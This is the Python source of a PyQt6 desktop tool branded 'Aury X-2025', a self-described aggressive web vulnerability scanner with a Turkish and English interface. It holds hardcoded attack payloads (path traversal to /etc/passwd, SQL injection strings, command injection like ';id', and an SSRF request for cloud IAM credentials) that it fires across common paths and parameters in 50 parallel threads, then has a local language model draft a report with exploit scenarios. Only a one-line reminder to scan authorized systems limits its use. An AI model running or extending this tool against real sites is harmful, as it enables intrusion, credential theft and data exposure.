
import sys, requests, re, random, locale, time
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from PyQt6.QtWidgets import *
from PyQt6.QtCore import *
from PyQt6.QtGui import *
import ollama



requests.packages.urllib3.disable_warnings()
session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

LFI = ["../../etc/passwd", "../../etc/passwd%00", "../"*15+"etc/passwd"]
SQLI = ["' OR '1'='1'--", "' OR '1'='1'/*", "' UNION SELECT NULL--"]
CMD = [";id", "|whoami"]
SSRF = ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"]
PATHS = ["","admin/","login.php","config.php","phpinfo.php",".env","backup/","wp-admin/","uploads/"]
ALL_PAYLOADS = LFI + SQLI + CMD + SSRF

TR = { "title":"Aury Software © 2025", "sub":"Made Aury Software • Türkiye’nin En Güçlü Zafiyet Tarayıcısı • 2025",
       "target":"Hedef Sistem", "ph":"https://hedefsite.com", "scan":"AGRESİF TARAMA BAŞLAT", "stop":"DURDUR",
       "ai":"Yapay Zeka Tehdit Analizi", "res":"Canlı Sonuçlar",
       "ready":"AI ULTRA hazır. Sadece yetkili sistemleri tarayın.",
       "scanning":"Tarama başladı → {}", "found":"KRİTİK BULUNDU → {}", "none":"Kritik zafiyet tespit edilmedi.",
       "analyzing":"AI raporu hazırlıyor...", "offline":"AI çevrimdışı → ollama run llama3.2" }

EN = { "title":"Aury Software © 2025", "sub":"Made Aury Software • Turkey’s Most Powerful Vulnerability Scanner • 2025",
       "target":"Target System", "ph":"https://target.com", "scan":"START AGGRESSIVE SCAN", "stop":"STOP",
       "ai":"AI Threat Intelligence", "res":"Live Results",
       "ready":"AI ULTRA ready. Only scan authorized systems.",
       "scanning":"Scan started → {}", "found":"CRITICAL → {}", "none":"No critical vulnerabilities found.",
       "analyzing":"AI generating report...", "offline":"AI offline → ollama run llama3.2" }

class Worker(QThread):
    log = pyqtSignal(str, bool)
    done = pyqtSignal()
    def __init__(self, base): super().__init__(); self.base = base.rstrip("/") + "/"; self.running = True
    def stop(self): self.running = False
    def run(self):
        def test(u):
            if not self.running: return None
            try:
                r = session.get(u, timeout=8, verify=False, allow_redirects=True)
                t = r.text.lower()
                if any(x in t for x in ["root:x:","uid=","mysql_fetch","syntax error","laravel","ami-id","role","<pre>","warning:","include("]) or r.status_code == 500:
                    return f"[KOD:{r.status_code}] {u}"
            except: pass
            return None

        targets = []
        for p in PATHS:
            b = urljoin(self.base, p)
            for pay in ALL_PAYLOADS:
                for param in ["id","q","file","page","url","dir","search"]:
                    targets.append(f"{b}?{param}={pay}")
                targets.append(b + pay)

        with ThreadPoolExecutor(max_workers=50) as ex:
            for f in as_completed(ex.submit(test, u) for u in targets):
                if not self.running: break
                res = f.result()
                if res: self.log.emit(res, True)
                time.sleep(0.001)
        self.done.emit()

class AuryX2025(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Aury Software © 2025")
        self.resize(1560, 960)

        self.lang = "TR" if (locale.getdefaultlocale()[0] or "").startswith("tr") else "EN"
        self.t = TR if self.lang == "TR" else EN

        central = QWidget()
        self.setCentralWidget(central)
        grid = QGridLayout(central)
        grid.setContentsMargins(30,30,30,30)
        grid.setSpacing(15)

       
        title = QLabel(self.t["title"])
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("""
            background: qlineargradient(x1:0, y1:0, x2:1, y2:1, stop:0 #001040, stop:1 #003087);
            color: white;
            font-size: 48px;
            font-weight: bold;
            padding: 38px;
            border-radius: 22px;
            border: 4px solid #00f0ff;
            text-shadow: 2px 2px 8px rgba(0,0,0,0.6);
        """)
        grid.addWidget(title, 0, 0, 1, 4)

        
        made_by = QLabel("Made Aury Software")
        made_by.setAlignment(Qt.AlignmentFlag.AlignCenter)
        made_by.setStyleSheet("color:#00205b; font-size:22px; font-weight:bold; font-style:italic; background:transparent; padding:10px;")
        grid.addWidget(made_by, 1, 0, 1, 4)

       
        self.lang_btn = QPushButton(self.lang)
        self.lang_btn.setFixedSize(64, 40)
        self.lang_btn.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0,y1:0,x2:1,y2:1,stop:0 #001040,stop:1 #00205b);
                color: white;
                font-weight: bold;
                font-size: 18px;
                border-radius: 20px;
                border: 3px solid #00f0ff;
                box-shadow: 0 0 15px #00f0ff;
            }
            QPushButton:hover {
                background: #003087;
                border: 3px solid white;
                box-shadow: 0 0 25px #00f0ff;
            }
        """)
        self.lang_btn.clicked.connect(self.switch_lang)

        top_right = QHBoxLayout()
        top_right.addStretch()
        top_right.addWidget(self.lang_btn)
        top_right.addSpacing(20)
        grid.addLayout(top_right, 0, 3, 1, 1, Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignRight)

        
        self.target_gb = QGroupBox(self.t["target"])
        self.target_gb.setStyleSheet("""
            QGroupBox{font-weight:bold;color:#003087;font-size:20px;border:3px solid #003087;border-radius:16px;background:white;padding-top:15px;}
            QGroupBox::title{subcontrol-origin:margin;left:20px;padding:0 15px;background:white;color:#003087;font-weight:bold;}
        """)
        vbox = QVBoxLayout(self.target_gb)
        self.target = QLineEdit()
        self.target.setFixedHeight(70)
        self.target.setPlaceholderText(self.t["ph"])
        hbox = QHBoxLayout()
        self.start_btn = QPushButton(self.t["scan"])
        self.stop_btn = QPushButton(self.t["stop"])
        self.stop_btn.setEnabled(False)
        self.start_btn.clicked.connect(self.start_scan)
        self.stop_btn.clicked.connect(self.stop_scan)
        hbox.addWidget(self.start_btn)
        hbox.addWidget(self.stop_btn)
        vbox.addWidget(self.target)
        vbox.addLayout(hbox)
        grid.addWidget(self.target_gb, 2, 0, 1, 4)

        # AI & Sonuçlar
        self.ai_gb = QGroupBox(self.t["ai"])
        self.ai_out = QTextEdit(); self.ai_out.setReadOnly(True)
        self.ai_gb.setLayout(QVBoxLayout()); self.ai_gb.layout().addWidget(self.ai_out)
        grid.addWidget(self.ai_gb, 3, 0, 2, 2)

        self.res_gb = QGroupBox(self.t["res"])
        self.res_out = QTextEdit(); self.res_out.setReadOnly(True)
        self.res_gb.setLayout(QVBoxLayout()); self.res_gb.layout().addWidget(self.res_out)
        grid.addWidget(self.res_gb, 3, 2, 2, 2)

        self.prog = QProgressBar(); self.prog.setRange(0,0); self.prog.hide()
        grid.addWidget(self.prog, 5, 0, 1, 4)

        self.setStyleSheet("""
            QMainWindow{background:#f0f4f8;}
            QLineEdit{font-size:22px;padding:20px;border:3px solid #003087;border-radius:16px;}
            QPushButton{background:#003087;color:white;font-weight:bold;font-size:20px;padding:20px;border-radius:16px;}
            QPushButton:hover{background:#00205b;}
            QPushButton:disabled{background:#666;}
            QTextEdit{font-family:Consolas;background:white;border:2px solid #ccc;font-size:15px;line-height:1.6;}
        """)

        self.ai_out.append('<span style="color:#003087;font-size:18px;font-weight:bold;">AI →</span> <b style="color:#00205b;font-size:16px;">' + self.t["ready"] + '</b>')

    def switch_lang(self):
        self.lang = "EN" if self.lang == "TR" else "TR"
        self.t = EN if self.lang == "EN" else TR
        self.lang_btn.setText(self.lang)
        self.target_gb.setTitle(self.t["target"])
        self.ai_gb.setTitle(self.t["ai"])
        self.res_gb.setTitle(self.t["res"])
        self.target.setPlaceholderText(self.t["ph"])
        self.start_btn.setText(self.t["scan"])
        self.stop_btn.setText(self.t["stop"])

    def log_ai(self, t): self.ai_out.append(f'<span style="color:#003087;font-size:16px;font-weight:bold;">AI →</span> {t}')
    def log_res(self, t, c=False): self.res_out.append(f'<span style="color:{"#d00000" if c else "#000000"};font-family:Consolas;font-weight:bold;">{t}</span>')

    def start_scan(self):
        url = self.target.text().strip()
        if not url: return
        if not url.startswith("http"): url = "https://" + url
        url = url.rstrip("/") + "/"
        self.res_out.clear(); self.ai_out.clear()
        self.log_ai(self.t["scanning"].format(url))
        self.prog.show(); self.start_btn.setEnabled(False); self.stop_btn.setEnabled(True)
        self.worker = Worker(url)
        self.worker.log.connect(lambda u,c: self.log_res(self.t["found"].format(u), True))
        self.worker.done.connect(self.scan_finished)
        self.worker.start()

    def stop_scan(self):
        if self.worker: self.worker.stop()
        self.scan_finished()

    def scan_finished(self):
        self.prog.hide(); self.start_btn.setEnabled(True); self.stop_btn.setEnabled(False)
        if not any(x in self.res_out.toPlainText() for x in ["KRİTİK","CRITICAL"]):
            self.log_ai(self.t["none"])
        self.ai_report()

    def ai_report(self):
        self.log_ai(self.t["analyzing"])
        vulns = re.findall(r"https?://[^\s\"'<>\]]+", self.res_out.toPlainText())
        if not vulns:
            self.log_ai("Zafiyet bulunamadı, rapor oluşturulmadı.")
            return
        listem = "\n".join(f"• {v}" for v in vulns)
        prompt = f"Profesyonel pentest raporu yaz ({'Türkçe' if self.lang=='TR' else 'English'}):\n\n{listem}\n\nHer zafiyet için CVSS skoru, risk seviyesi, exploit senaryosu ve düzeltme önerisi ekle."
        try:
            r = ollama.generate(model="llama3.2", prompt=prompt, options={"temperature":0.3,"num_predict":4000})
            rep = r['response'].replace("\n","<br>")
            self.log_ai(f"<b style='color:#00205b;font-size:18px;'> RAPOR HAZIR:</b><br><br>{rep}")
        except: self.log_ai(self.t["offline"])


app = QApplication(sys.argv)
app.setStyle("Fusion")
win = AuryX2025()
win.show()
print("\nAURY X-2025 ULTRA BAŞLATILDI! Made Aury Software © 2025")
print("GitHub:https://github.com/AuryBaba ")
sys.exit(app.exec())
